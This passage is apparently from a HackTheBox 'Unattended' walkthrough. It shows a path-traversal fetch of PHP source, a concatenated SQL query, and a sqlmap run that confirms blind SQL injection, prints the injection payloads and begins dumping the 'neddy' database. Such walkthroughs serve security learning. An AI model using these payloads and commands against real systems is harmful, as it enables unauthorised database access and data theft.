<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"6fb17817efb4131ae4ae1acae0f7fd48.php"</span>;</span><br></pre></td></tr></table></figure>
<p>I downloaded that page but it had nothing interesting :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended<span class="comment"># curl -k https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'user_name'</span>]))&#123;</span><br><span class="line">        $user_name = $_SESSION[<span class="string">'user_name'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        $_SESSION[$key] = $val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* removed everything because of undergoing investigation, please check dev and staging */</span></span><br></pre></td></tr></table></figure>
<p>We can also see this :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$valid_ids = <span class="keyword">array</span> (<span class="number">25</span>,<span class="number">465</span>,<span class="number">587</span>);</span><br><span class="line">	<span class="keyword">if</span> ( (array_key_exists(<span class="string">'id'</span>, $_GET)) &amp;&amp; (intval($_GET[<span class="string">'id'</span>]) == $_GET[<span class="string">'id'</span>]) &amp;&amp; (in_array(intval($_GET[<span class="string">'id'</span>]),$valid_ids)) ) &#123;</span><br><span class="line">			$sql = <span class="string">"SELECT name FROM idname where id = '"</span>.$_GET[<span class="string">'id'</span>].<span class="string">"'"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$sql = <span class="string">"SELECT name FROM idname where id = '25'"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>It defines an array called <code>valid_ids</code>, then it checks the <code>GET</code> parameter <code>id</code>, if it exists and it’s in the <code>valid_ids</code> array, it will append it to this <code>SQL</code> query : <code>SELECT name FROM idname where id = [ID HERE]</code>.<br>To understand what’s happening in a better way let’s check the website again.<br><img src="/images/hackthebox/unattended/8.png" alt=""><br>There are 3 pages, <code>main</code>, <code>about</code> and <code>contact</code>.  By visiting them we notice that the <code>id</code> parameter is added and each page has one of the ids we saw in the <code>php</code> code : 25 (main), 465 (about) and 587 (contact).<br><img src="/images/hackthebox/unattended/9.png" alt=""><br><img src="/images/hackthebox/unattended/10.png" alt=""><br><img src="/images/hackthebox/unattended/11.png" alt=""><br>I tried adding a single quote to <code>https://www.nestedflanders.htb/index.php?id=465</code> and I got the main page instead of the about page because the query failed :<br><img src="/images/hackthebox/unattended/12.png" alt=""><br>When I fixed the query it worked :<br><img src="/images/hackthebox/unattended/13.png" alt=""><br>I started <code>sqlmap</code> to automate it and dump the database :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended<span class="comment"># sqlmap -u https://www.nestedflanders.htb/index.php?id=465 --dump-all</span></span><br><span class="line">       __H__</span><br><span class="line">___ ___ ["]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [.]     | .'| . |                                                                   </span><br><span class="line">|___|_  [']_|_|_|__,|  _|                                                                   </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                           </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[*] starting @ 17:12:07 /2019-08-23/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[17:12:08] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[17:12:10] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[17:12:10] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[17:12:11] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[17:12:11] [INFO] testing if GET parameter '</span><span class="keyword">id</span><span class="string">' is dynamic</span></span><br><span class="line"><span class="string">[17:12:12] [INFO] GET parameter '</span><span class="keyword">id</span><span class="string">' appears to be dynamic                </span></span><br><span class="line"><span class="string">[17:12:15] [WARNING] heuristic (basic) test shows that GET parameter '</span><span class="keyword">id</span><span class="string">' might not be injectable</span></span><br><span class="line"><span class="string">[17:12:16] [INFO] testing for SQL injection on GET parameter '</span><span class="keyword">id</span><span class="string">'</span></span><br><span class="line"><span class="string">[17:12:16] [INFO] testing '</span><span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:25] [INFO] GET parameter '</span><span class="keyword">id</span><span class="string">' appears to be '</span><span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">' injectable (with --string="form")</span></span><br><span class="line"><span class="string">[17:12:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be '</span>MySQL<span class="string">'</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is '</span>MySQL<span class="string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for '</span>MySQL<span class="string">' extending provided level (1) and risk (1) values? [Y/n] y </span></span><br><span class="line"><span class="string">[17:12:41] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'                 </span></span><br><span class="line"><span class="string">[17:12:42] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'              </span></span><br><span class="line"><span class="string">[17:12:42] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">EXP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:43] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">EXP</span>)<span class="string">'    </span></span><br><span class="line"><span class="string">[17:12:44] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (JSON_KEYS)<span class="string">'             </span></span><br><span class="line"><span class="string">[17:12:44] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (JSON_KEYS)<span class="string">'                  </span></span><br><span class="line"><span class="string">[17:12:45] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'            </span></span><br><span class="line"><span class="string">[17:12:45] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">' </span></span><br><span class="line"><span class="string">[17:12:46] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (EXTRACTVALUE)<span class="string">'      </span></span><br><span class="line"><span class="string">[17:12:47] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (EXTRACTVALUE)<span class="string">'   </span></span><br><span class="line"><span class="string">[17:12:48] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (UPDATEXML)<span class="string">'        </span></span><br><span class="line"><span class="string">[17:12:49] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (UPDATEXML)<span class="string">'        </span></span><br><span class="line"><span class="string">[17:12:50] [INFO] testing '</span>MySQL &gt;= <span class="number">4.1</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:50] [INFO] testing '</span>MySQL &gt;= <span class="number">4.1</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:51] [INFO] testing '</span>MySQL <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:53] [INFO] testing '</span>PostgreSQL <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:53] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">IN</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:54] [INFO] testing '</span><span class="keyword">Oracle</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">XMLType</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:55] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - <span class="keyword">PROCEDURE</span> ANALYSE (EXTRACTVALUE)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="keyword">EXP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (JSON_KEYS)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (<span class="keyword">FLOOR</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (UPDATEXML)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.1</span> <span class="keyword">error</span>-based - Parameter <span class="keyword">replace</span> (EXTRACTVALUE)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>MySQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:56] [INFO] testing '</span>PostgreSQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:57] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:58] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:12:59] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:00] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">query</span> <span class="keyword">SLEEP</span> - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:00] [INFO] testing '</span>MySQL &gt; <span class="number">5.0</span><span class="number">.11</span> stacked queries (<span class="keyword">query</span> <span class="keyword">SLEEP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:01] [INFO] testing '</span>MySQL &lt; <span class="number">5.0</span><span class="number">.12</span> stacked queries (heavy <span class="keyword">query</span> - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:02] [INFO] testing '</span>MySQL &lt; <span class="number">5.0</span><span class="number">.12</span> stacked queries (heavy <span class="keyword">query</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:03] [INFO] testing '</span>PostgreSQL &gt; <span class="number">8.1</span> stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:03] [INFO] testing '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>/Sybase stacked queries (<span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:04] [INFO] testing '</span><span class="keyword">Oracle</span> stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - <span class="keyword">comment</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:04] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind<span class="string">'</span></span><br><span class="line"><span class="string">[17:13:17] [INFO] GET parameter '</span><span class="keyword">id</span><span class="string">' appears to be '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind<span class="string">' injectable </span></span><br><span class="line"><span class="string">[17:13:17] [INFO] testing '</span>Generic <span class="keyword">UNION</span> <span class="keyword">query</span> (<span class="literal">NULL</span>) - <span class="number">1</span> <span class="keyword">to</span> <span class="number">20</span> <span class="keyword">columns</span><span class="string">'</span></span><br><span class="line"><span class="string">[17:13:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[17:13:18] [INFO] '</span><span class="keyword">ORDER</span> <span class="keyword">BY</span><span class="string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection tech</span></span><br><span class="line"><span class="string">nique test</span></span><br><span class="line"><span class="string">[17:13:22] [INFO] target URL appears to have 1 column in query</span></span><br><span class="line"><span class="string">[17:13:25] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '</span><span class="comment">--dbms=mysql')</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">13</span>:<span class="number">38</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 1 to 20 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">13</span>:<span class="number">52</span>] [INFO] testing <span class="string">'MySQL UNION query (random number) - 1 to 20 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">14</span>:<span class="number">05</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 21 to 40 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">14</span>:<span class="number">20</span>] [INFO] testing <span class="string">'MySQL UNION query (random number) - 21 to 40 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">14</span>:<span class="number">35</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 41 to 60 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">14</span>:<span class="number">48</span>] [INFO] testing <span class="string">'MySQL UNION query (random number) - 41 to 60 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">15</span>:<span class="number">02</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 61 to 80 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">15</span>:<span class="number">16</span>] [INFO] testing <span class="string">'MySQL UNION query (random number) - 61 to 80 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">15</span>:<span class="number">29</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 81 to 100 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">15</span>:<span class="number">44</span>] [INFO] testing <span class="string">'MySQL UNION query (random number) - 81 to 100 columns'</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">15</span>:<span class="number">59</span>] [INFO] checking <span class="keyword">if</span> the injection point <span class="keyword">on</span> <span class="keyword">GET</span> parameter <span class="string">'id'</span> <span class="keyword">is</span> a <span class="literal">false</span> positive</span><br><span class="line"><span class="keyword">GET</span> parameter <span class="string">'id'</span> <span class="keyword">is</span> vulnerable. <span class="keyword">Do</span> you want <span class="keyword">to</span> <span class="keyword">keep</span> testing the others (<span class="keyword">if</span> <span class="keyword">any</span>)? [y/N] n</span><br><span class="line">sqlmap <span class="keyword">identified</span> the <span class="keyword">following</span> injection point(s) <span class="keyword">with</span> a total <span class="keyword">of</span> <span class="number">296</span> <span class="keyword">HTTP</span>(s) requests:</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">Parameter: <span class="keyword">id</span> (<span class="keyword">GET</span>)</span><br><span class="line">    <span class="keyword">Type</span>: <span class="built_in">boolean</span>-based blind</span><br><span class="line">    Title: <span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause</span><br><span class="line">    Payload: <span class="keyword">id</span>=<span class="number">465</span><span class="string">' AND 6602=6602 AND '</span>YxJr<span class="string">'='</span>YxJr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Type</span>: <span class="built_in">time</span>-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="built_in">time</span>-based blind</span><br><span class="line">    Payload: <span class="keyword">id</span>=<span class="number">465</span><span class="string">' AND SLEEP(5) AND '</span>APKt<span class="string">'='</span>APKt</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">16</span>:<span class="number">20</span>] [INFO] the back-<span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL</span><br><span class="line">web application technology: Nginx <span class="number">1.10</span><span class="number">.3</span></span><br><span class="line">back-<span class="keyword">end</span> DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">16</span>:<span class="number">20</span>] [INFO] sqlmap will dump entries <span class="keyword">of</span> <span class="keyword">all</span> <span class="keyword">tables</span> <span class="keyword">from</span> <span class="keyword">all</span> <span class="keyword">databases</span> <span class="keyword">now</span></span><br></pre></td></tr></table></figure>
<p>There are 2 databases, <code>information_schema</code> and <code>neddy</code> :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[17:20:49] [INFO] the back-<span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL</span><br><span class="line">web application technology: Nginx <span class="number">1.10</span><span class="number">.3</span></span><br><span class="line">back-<span class="keyword">end</span> DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">20</span>:<span class="number">49</span>] [INFO] sqlmap will dump entries <span class="keyword">of</span> <span class="keyword">all</span> <span class="keyword">tables</span> <span class="keyword">from</span> <span class="keyword">all</span> <span class="keyword">databases</span> <span class="keyword">now</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">20</span>:<span class="number">49</span>] [INFO] fetching <span class="keyword">database</span> <span class="keyword">names</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">20</span>:<span class="number">49</span>] [INFO] fetching <span class="built_in">number</span> <span class="keyword">of</span> <span class="keyword">databases</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">20</span>:<span class="number">49</span>] [INFO] resumed: <span class="number">2</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">20</span>:<span class="number">49</span>] [INFO] retrieving the <span class="keyword">length</span> <span class="keyword">of</span> <span class="keyword">query</span> <span class="keyword">output</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">20</span>:<span class="number">49</span>] [INFO] retrieved: <span class="number">18</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">21</span>:<span class="number">09</span>] [INFO] retrieved: information_schema</span><br><span class="line">[<span class="number">17</span>:<span class="number">21</span>:<span class="number">09</span>] [INFO] retrieving the <span class="keyword">length</span> <span class="keyword">of</span> <span class="keyword">query</span> <span class="keyword">output</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">21</span>:<span class="number">09</span>] [INFO] retrieved: <span class="number">5</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">21</span>:<span class="number">21</span>] [INFO] retrieved: neddy</span><br><span class="line">[<span class="number">17</span>:<span class="number">21</span>:<span class="number">21</span>] [INFO] fetching <span class="keyword">tables</span> <span class="keyword">for</span> <span class="keyword">databases</span>: <span class="string">'information_schema, neddy'</span></span><br></pre></td></tr></table></figure>
<p>We don’t need <code>information_schema</code> in anything and also dumping <code>neddy</code> with that kind of injection would take a lot of time, let’s take a look at the tables. </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">[17:37:48] [INFO] fetching tables for database: 'neddy'</span><br><span class="line">[17:37:48] [INFO] fetching number of tables for database 'neddy'</span><br><span class="line">[17:37:48] [INFO] resumed: 11</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 6</span><br><span class="line">[17:37:48] [INFO] resumed: config</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 9</span><br><span class="line">[17:37:48] [INFO] resumed: customers</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 9</span><br><span class="line">[17:37:48] [INFO] resumed: employees</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 8</span><br><span class="line">[17:37:48] [INFO] resumed: filepath</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 6</span><br><span class="line">[17:37:48] [INFO] resumed: idname</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span 